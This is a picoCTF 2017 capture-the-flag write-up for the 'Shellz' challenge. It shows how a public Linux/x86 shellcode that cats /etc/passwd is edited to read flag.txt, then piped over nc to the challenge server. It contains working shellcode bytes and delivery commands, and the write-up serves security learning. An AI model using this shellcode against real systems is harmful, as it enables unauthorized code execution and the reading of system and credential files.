**Challenge name:** Shellz  
**Description:** You no longer have an easy thing to call, but you have more space. Program: shellz! Source. Connect on shell2017.picoctf.com:6942.  
**Hint:** There is a bunch of preexisting shellcode already out there!  
**File(s) provided:**  
- shellz (ELF 32-bit binary)
- shell.c (source code)

---
# Step 0: Recon
They've given us a binary that reads up to 40 bytes and executes it. We can solve the challenge by sending it shellcode to read the flag (assuming we can get it to fit inside 40 bytes).

# Step 1 : Find shellcode to read a file
The following shellcode reads ```/etc/passwd``` and is 43 bytes long. The size is not a problem because we need to read "flag.txt" which is 4 bytes shorter than "/etc/passwd", meaning we'll need 5 bytes less (4 bytes for the text, 1 byte for the push instruction). 
``` python
s = ''
s += "\x31\xc0"			# xorl %eax,%eax
s += "\x99" 			# cdq
s += "\x52" 			# push edx
s += "\x68\x2f\x63\x61\x74" 	# push dword 0x7461632f
s += "\x68\x2f\x62\x69\x6e" 	# push dword 0x6e69622f
s += "\x89\xe3" 		# mov ebx,esp
s += "\x52" 			# push edx
s += "\x68\x73\x73\x77\x64" 	# push dword 0x64777373
s += "\x68\x2f\x2f\x70\x61" 	# push dword 0x61702f2f
s += "\x68\x2f\x65\x74\x63"	# push dword 0x6374652f
s += "\x89\xe1" 		# mov ecx,esp
s += "\xb0\x0b" 		# mov $0xb,%al
s += "\x52" 			# push edx
s += "\x51" 			# push ecx
s += "\x53" 			# push ebx
s += "\x89\xe1" 		# mov ecx,esp
s += "\xcd\x80"  		# int 80h
```
Linux/x86 - bin/cat /etc/passwd - 43 bytes  
Source: http://shell-storm.org/shellcode/files/shellcode-571.php

# Step 2: Inspect the shellcode
First, we need to find where the file is specified. This is the relevant part:
``` python
s += "\x68\x73\x73\x77\x64" 	# push dword 0x64777373
s += "\x68\x2f\x2f\x70\x61" 	# push dword 0x61702f2f
s += "\x68\x2f\x65\x74\x63"	# push dword 0x6374652f
```
The first byte (```\x68```) for each of these lines is for the push instruction; the rest 4 bytes are the data being pushed.

Data:
```
73737764  
2f2f7061  
2f657463  
```
ASCII hex decode:
```
sswd  
//pa  
/etc  
```
I'm not sure why you need 2 slashes, but it won't matter because we don't need slashes anyway.

# Step 3: Edit the shellcode
Based on the example above, we want to encode the following:
```
.txt  
flag  
```
ASCII hex encoded:
```
2E747874  
666C6167  
```
The relevant lines of the shellcode become (don't forget the instruction byte):
``` python
s += "\x68\x2e\x74\x78\x74" 	# push dword ".txt"
s += "\x68\x66\x6c\x61\x67"	# push dword "flag"
```

# Step 4: Test locally
Create a ```flag.txt``` file with some test data inside.
Copy the shellcode into a python file to print it, then pass that output to the binary.

``` bash
# python shellcode.py |./shellz
My mother told me to never accept things from strangers
How bad could running a couple bytes be though?
Give me 40 bytes:
test
```

# Step 5: Execute to get flag
```bash
# python shellcode.py | nc shell2017.picoctf.com 6942
My mother told me to never accept things from strangers
How bad could running a couple bytes be though?
Give me 40 bytes:
4effa67d6909029fd3cc45600f024e3f
```
